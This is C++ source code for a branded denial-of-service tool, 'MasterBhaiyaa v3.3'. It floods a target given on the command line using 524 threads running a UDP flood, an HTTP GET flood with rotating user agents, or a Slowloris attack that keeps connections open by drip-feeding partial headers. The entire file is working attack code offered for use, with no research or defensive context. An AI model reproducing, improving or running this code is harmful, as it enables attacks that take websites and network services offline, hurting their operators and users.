#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include <atomic>
#include <csignal>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <random>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>

#define THREAD_COUNT 524
#define DEFAULT_PAYLOAD_SIZE 24
#define BINARY_NAME "MasterBhaiyaa"

std::atomic<bool> stop_flag(false);

struct AttackConfig {
    std::string ip;
    int port;
    int duration;
    int payload_size;
    std::string attack_type;
};

// Signal handler
void handle_signal(int signal) {
    std::cout << "\n[!] Interrupt received. Stopping attack...\n";
    stop_flag = true;
}

// Validate IP or Domain
bool is_valid_target(const std::string &target) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, target.c_str(), &(sa.sin_addr)) != 0;
}

// Generate randomized user-agent
std::string random_user_agent() {
    std::vector<std::string> user_agents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)"
    };
    return user_agents[rand() % user_agents.size()];
}

// UDP Flood Attack (L4)
void udp_attack(const AttackConfig &config) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    sockaddr_in target_addr = {};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(config.port);
    target_addr.sin_addr.s_addr = inet_addr(config.ip.c_str());

    std::vector<uint8_t> payload(config.payload_size, 0x41);

    auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(config.duration);

    while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
        sendto(sock, payload.data(), payload.size(), 0, 
               (struct sockaddr *)&target_addr, sizeof(target_addr));
    }

    close(sock);
}

// HTTP Flood Attack (L7)
void http_flood(const AttackConfig &config) {
    struct sockaddr_in server;
    struct hostent *host;

    host = gethostbyname(config.ip.c_str());
    if (!host) return;

    server.sin_family = AF_INET;
    server.sin_port = htons(config.port);
    server.sin_addr = *((struct in_addr *)host->h_addr);

    auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(config.duration);

    while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
            close(sock);
            continue;
        }

        std::string request = "GET / HTTP/1.1\r\n"
                              "Host: " + config.ip + "\r\n"
                              "User-Agent: " + random_user_agent() + "\r\n"
                              "Connection: keep-alive\r\n"
                              "\r\n";

        send(sock, request.c_str(), request.length(), 0);
        close(sock);
    }
}

// Slowloris Attack (L7)
void slowloris(const AttackConfig &config) {
    struct sockaddr_in server;
    struct hostent *host;

    host = gethostbyname(config.ip.c_str());
    if (!host) return;

    server.sin_family = AF_INET;
    server.sin_port = htons(config.port);
    server.sin_addr = *((struct in_addr *)host->h_addr);

    std::vector<int> sockets;
    for (int i = 0; i < 150; ++i) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
            close(sock);
            continue;
        }

        std::string request = "GET / HTTP/1.1\r\n"
                              "Host: " + config.ip + "\r\n"
                              "User-Agent: " + random_user_agent() + "\r\n";

        send(sock, request.c_str(), request.length(), 0);
        sockets.push_back(sock);
    }

    auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(config.duration);

    while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
        for (auto sock : sockets) {
            send(sock, "X-a: b\r\n", 8, 0);
        }
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }

    for (auto sock : sockets) {
        close(sock);
    }
}

// Main function
int main(int argc, char *argv[]) {
    if (argc < 4 || argc > 5) {
        std::cerr << "Usage: ./MasterBhaiyaa <target> <port> <duration> [attack_type]\n";
        return EXIT_FAILURE;
    }

    AttackConfig config;
    config.ip = argv[1];
    config.port = std::stoi(argv[2]);
    config.duration = std::stoi(argv[3]);
    config.attack_type = (argc == 5) ? argv[4] : "UDP";

    // Validate Target
    if (!is_valid_target(config.ip)) {
        std::cerr << "Invalid target: " << config.ip << "\n";
        return EXIT_FAILURE;
    }

    std::signal(SIGINT, handle_signal);

    std::cout << "=====================================\n";
    std::cout << "      MasterBhaiyaa v3.3 - L4 & L7     \n";
    std::cout << "=====================================\n";
    std::cout << "Target: " << config.ip << ":" << config.port << "\n";
    std::cout << "Duration: " << config.duration << " seconds\n";
    std::cout << "Threads: " << THREAD_COUNT << "\n";
    std::cout << "Attack Type: " << config.attack_type << "\n";
    std::cout << "=====================================\n\n";

    std::vector<std::thread> threads;

    for (int i = 0; i < THREAD_COUNT; ++i) {
        if (config.attack_type == "UDP") {
            threads.emplace_back(udp_attack, config);
        } else if (config.attack_type == "HTTP") {
            threads.emplace_back(http_flood, config);
        } else if (config.attack_type == "SLOWLORIS") {
            threads.emplace_back(slowloris, config);
        } else {
            std::cerr << "Invalid attack type. Use: UDP, HTTP, SLOWLORIS\n";
            return EXIT_FAILURE;
        }
        std::cout << "[+] Thread " << i + 1 << " launched.\n";
    }

    for (auto &thread : threads) {
        thread.join();
    }

    std::cout << "\n[✔] Attack completed.\n";
    std::cout << "© @MasterBhaiyaa\n";

    return EXIT_SUCCESS;
}
